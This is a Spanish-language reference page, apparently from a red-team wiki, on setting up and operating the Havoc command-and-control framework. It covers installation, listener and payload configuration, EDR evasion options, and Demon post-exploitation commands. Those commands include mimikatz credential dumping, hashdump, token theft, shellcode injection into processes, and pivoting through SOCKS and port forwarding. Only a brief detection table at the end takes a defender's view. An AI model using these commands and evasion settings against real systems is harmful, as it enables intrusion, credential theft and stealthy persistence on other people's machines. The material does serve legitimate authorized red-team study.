---
icon: transmission
---

# Havoc C2



Havoc es un framework de C2 open source desarrollado por C5pider, escrito en C y Go. Surgió como alternativa moderna a Cobalt Strike con menor tasa de detección y arquitectura modular. Sus implantes se llaman **Demons** y soportan comunicación HTTP/S y SMB. Al ser más reciente que Sliver o Cobalt Strike, las firmas de detección en EDRs son menos maduras, lo que lo convierte en una opción interesante para operaciones donde la evasión es prioritaria.

### Arquitectura

```
[Operador] → Havoc Client (GUI) → [Havoc Teamserver] ← Demon en el target
```

Havoc tiene una interfaz gráfica propia similar a Cobalt Strike, con una consola central, gestión de listeners y un panel de sesiones activas.

### Instalación

```bash
# Dependencias
sudo apt install -y git build-essential apt-utils cmake libfontconfig1 \
  libglu1-mesa-dev libgtest-dev libspdlog-dev libboost-all-dev \
  libncurses5-dev libgdbm-dev libssl-dev libreadline-dev libffi-dev \
  libsqlite3-dev libbz2-dev mesa-common-dev qtbase5-dev \
  qtchooser qt5-qmake qtbase5-dev-tools golang-go

# Clonar el repositorio
git clone https://github.com/HavocFramework/Havoc
cd Havoc

# Compilar el teamserver
cd teamserver
go mod download golang.org/x/sys
go mod download github.com/ugorji/go
make

# Compilar el cliente
cd ../client
make
```

### Configuración del Teamserver

Havoc usa un archivo YAML para configurar el servidor:

```yaml
# profiles/havoc.yaotl
Teamserver:
  Host: 0.0.0.0
  Port: 40056

Operators:
  - Name: pyrhos
    Password: contraseñaSegura123

Listeners:
  - Name: http-listener
    Protocol: http
    Host: 10.10.10.1
    Port: 80
    Secure: false
```

```bash
# Arrancar el teamserver con el perfil
./teamserver server --profile profiles/havoc.yaotl

# Arrancar el cliente
./client
```

### Listeners

```
# Desde la GUI: View → Listeners → Add

# HTTP listener
Name: http-listener
Protocol: http
Host/Bind: 10.10.10.1
Port: 80

# HTTPS listener
Protocol: https
Host: 10.10.10.1
Port: 443
Cert/Key: /ruta/cert.pem /ruta/key.pem

# SMB listener (lateral movement sin red externa)
Protocol: smb
PipeName: mi_pipe_name
```

### Generación de Demons

```
# Desde la GUI: Attack → Payload

# Opciones principales:
# Format: Windows EXE / Shellcode / DLL
# Arch: x64 / x86
# Config: Sleep, Jitter, Indirect Syscalls, Stack Duplication
```

Desde línea de comandos con el API de Havoc:

```bash
# Usando la API REST del teamserver (requiere autenticación)
curl -X POST http://teamserver:40056/api/payload \
  -H "Authorization: Bearer TOKEN" \
  -d '{"listener": "http-listener", "format": "exe", "arch": "x64"}'
```

### Características de evasión nativas

Havoc implementa varias técnicas de evasión directamente en el Demon:

**Indirect Syscalls** — el Demon no llama a las APIs de Windows directamente sino que resuelve las syscalls en tiempo de ejecución, evitando los hooks de los EDRs en `ntdll.dll`.

**Stack Duplication** — durante el sleep, el Demon copia su stack a un área cifrada de memoria y limpia el stack original, reduciendo la visibilidad para herramientas de escaneo de memoria.

**Sleep Obfuscation** — cifra el propio código del Demon en memoria mientras está dormido.

```
# Activar en la generación del payload
Indirect Syscalls: ✓
Stack Duplication: ✓
Sleep Obfuscation: ✓
```

### Comandos dentro del Demon

```bash
# Información del sistema
shell whoami
shell systeminfo
ps                      # lista de procesos

# Ejecución en memoria
dotnet inline-execute /ruta/SharpHound.exe -- -c all
powershell Get-Process

# Injection
inject --pid 1234 --shellcode /ruta/payload.bin

# Credenciales
mimikatz -- "sekurlsa::logonpasswords"
hashdump

# Pivoting
socks5 --port 1080
portfwd add --lport 13389 --rhost 192.168.1.10 --rport 3389

# Tokens
token steal --pid 1234     # robar token de proceso
token revert               # volver al token original

# Descarga / Subida
download C:\ruta\archivo
upload /local/archivo C:\ruta\destino
```

### Módulos externos

Havoc soporta módulos escritos en Python que se integran en el cliente:

```python
# Ejemplo de módulo básico
from havoc import Demon, RegisterCommand

def mi_comando(demon: Demon, args: list):
    demon.ConsoleWrite(demon.CONSOLE_INFO, "Ejecutando...")
    demon.InlineExecute(open("herramienta.o", "rb").read(), "go", args)

RegisterCommand(mi_comando, "mi-cmd", "Descripción", [], 0, "")
```

### Detección — perspectiva Blue Team

| Indicador            | Descripción                                                                      |
| -------------------- | -------------------------------------------------------------------------------- |
| Pipe names           | Pipes SMB con nombres configurables — buscar patrones no estándar                |
| Syscalls directas    | Ausencia de llamadas a APIs estándar de Windows — comportamiento anómalo         |
| Cifrado en memoria   | Regiones de memoria que se cifran/descifran periódicamente                       |
| Cabeceras HTTP       | User-agents y cabeceras configurables — buscar inconsistencias                   |
| Compilación dinámica | Los Demons se compilan en el teamserver — detección por comportamiento, no firma |

> La detección de Havoc es más difícil que Cobalt Strike precisamente porque sus firmas son menos maduras en la mayoría de soluciones. Sin embargo, las técnicas de indirect syscalls y stack duplication ya tienen detección en EDRs avanzados como CrowdStrike Falcon y SentinelOne desde 2023-2024.
